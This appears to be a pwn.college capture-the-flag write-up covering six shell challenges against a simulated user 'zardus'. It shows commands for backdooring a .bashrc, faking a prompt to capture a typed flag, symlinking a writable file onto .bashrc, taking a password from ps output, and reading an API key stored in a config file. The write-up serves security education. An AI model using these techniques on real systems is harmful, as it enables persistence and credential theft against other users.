
## Bashrc Backdoor

We can edit the `.bashrc` of `zardus` user and `zardus` has read permissions for the `/flag` file so we edited the `.bashrc` file of `zardus` and executed the `/challenge/victim` which will login as `zardus` user and exit.

```bash
$ cat /home/zardus/.bashrc
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
cat /flag
$ /challenge/victim
Username: zardus
Password: *********
pwn.college{redacted}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
```

## Sniffing Input

This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named `flag_checker`, manually typing the flag into it for verification. **HINT:** Is Zardus getting spooked by your hijack? He's careful --- he checks for the `flag_checker` prompt of `Type the flag`. Make sure your hijack also prints this prompt (e.g., `echo "Type the flag"`). Other than printing that prompt, your fake `flag_checker` can either just a) `cat` Zardus's input to stdout (e.g., `cat with no arguments`) or b) `read` it into a variable and `echo` it out

```bash
/home/zardus$ vim .bashrc
/home/zardus$ cat .bashrc
#!/bin/bash
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
flag_checker
echo 'Type the flag, victim: '
read flag
echo $flag
/home/zardus$ /challenge/victim
Username: zardus
Password: ***********
Type the flag, victim: flag_checker

Incorrect!
Type the flag, victim: 
************************************************************pwn.college{redacted}
zardus@shenanigans~sniffing-input:~$ exit
logout
```

## Overshared Directories

Same rule as the previous challenge but this time the home directory of `zardus` is accessible but not the `.bashrc`

```bash
/home/zardus$ echo '
#!/bin/bash 
flag_checker 
echo 'Type the flag, victim: ' 
read flag 
echo $flag
' > .bashrc
/home/zardus$ /challenge/victim
Username: zardus
Password: **********
Type the flag, victim: flag_checker

Incorrect!
Type the flag, victim:
************************************************************pwn.college{redacted}
zardus@shenanigans~overshared-directories:~$ exit
logout
```

## Tricky Linking

This time the `/tmp/collab/` directory is made writable so we don't have access to `.bashrc` of `zardus` user. When we run `/challenge/victim` it writes the `cat /flag` command into the `/tmp/collab/evil-commands.txt`. Since we have writable access to `/tmp/collab` we can try to establish **SYMBOLIC LINK** between `/tmp/collab/evil-commands.txt` and `.bashrc` of `zardus`. This way we need to run `/challenge/victim` twice. Once for writing the command and another for execution of it.

```bash
$ /challenge/victim
Username: zardus
Password: **********
$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
$ rm /tmp/collab/evil-commands.txt 
rm: remove write-protected regular file '/tmp/collab/evil-commands.txt'? y
$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
$ ls -l /tmp/collab/evil-commands.txt 
lrwxrwxrwx 1 hacker hacker 20 Jan  2 12:14 /tmp/collab/evil-commands.txt -> /home/zardus/.bashrc
$ /challenge/victim
Username: zardus
Password: **********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
$ cat .bashrc
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
cat /flag
$ /challenge/victim
Username: zardus
Password: **********
pwn.college{redacted}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab^CTraceback (most recent call last):
  File "/challenge/victim", line 39, in <module>
    cmd(p, """echo "cat /flag" >> /tmp/collab/evil-commands.txt\n""")
  File "/challenge/victim", line 19, in cmd
    slow_type(s, to=p)
  File "/challenge/victim", line 16, in slow_type
    time.sleep(0.1)
KeyboardInterrupt
```

## Sniffing Process Arguments

Using the `ps` command revealed us the `zardus` password and we can use the `su` command to change users. `zardus` is in `sudoers` file so we can use the `sudo` command to read the `/flag` file.

```bash
$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   1056   640 ?        Ss   12:22   0:00 /sbin/docker-init -- /nix/var/nix/profiles/dojo-workspace/bi
root           7  0.0  0.0 231708  2560 ?        S    12:22   0:00 /run/dojo/bin/sleep 6h
root         149  0.0  0.0   5204  3520 ?        S    12:22   0:00 su -c auto.sh --user zardus --pass pw_1330725015 zardus
zardus       153  0.0  0.0   4132  2560 ?        Ss   12:22   0:00 /bin/bash /run/challenge/bin/auto.sh --user zardus --pass pw
zardus       154  0.0  0.0 231708  2560 ?        S    12:22   0:00 sleep 6h
hacker       167  0.0  0.0 1126012 76736 ?       Sl   12:22   0:00 /nix/store/a1kxazxkgw7mjbjgisvah95p1r3n5ykl-nodejs-22.16.0/b
hacker       190  0.3  0.0 1375220 132288 ?      Rl   12:22   0:11 /nix/store/a1kxazxkgw7mjbjgisvah95p1r3n5ykl-nodejs-22.16.0/b
hacker       232  1.6  0.0 11846388 116680 ?     Sl   12:23   0:57 /nix/store/a1kxazxkgw7mjbjgisvah95p1r3n5ykl-nodejs-22.16.0/b
hacker       269  0.0  0.0 1050964 62992 ?       Sl   12:24   0:00 /nix/store/a1kxazxkgw7mjbjgisvah95p1r3n5ykl-nodejs-22.16.0/b
hacker      9612  0.6  0.0 1129448 68312 ?       Sl   13:18   0:01 /nix/store/a1kxazxkgw7mjbjgisvah95p1r3n5ykl-nodejs-22.16.0/b
hacker      9629  0.0  0.0 232076  4160 pts/0    Ss   13:18   0:00 /run/dojo/bin/bash --init-file /nix/store/5hs5m65ajn7i3s6k20
hacker     10734  0.0  0.0 233600  3840 pts/0    R+   13:21   0:00 ps aux
$ su zardus
Password: 
zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat /flag
pwn.college{redacted}
```

## Snooping on Configurations

`zardus` stores his key in `.bashrc` 
**NOTE:** When you get the API key, just execute `flag_getter` as the `hacker` user. This challenge's `/challenge/victim` is just for theming: you don't need to use it.

```bash
$ cat /home/zardus/.bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
FLAG_GETTER_API_KEY=sk-2834229046
$ flag_getter sk-2834229046
Correct API key! Do you want me to print the flag (y/n)?
y
pwn.college{redacted}
```

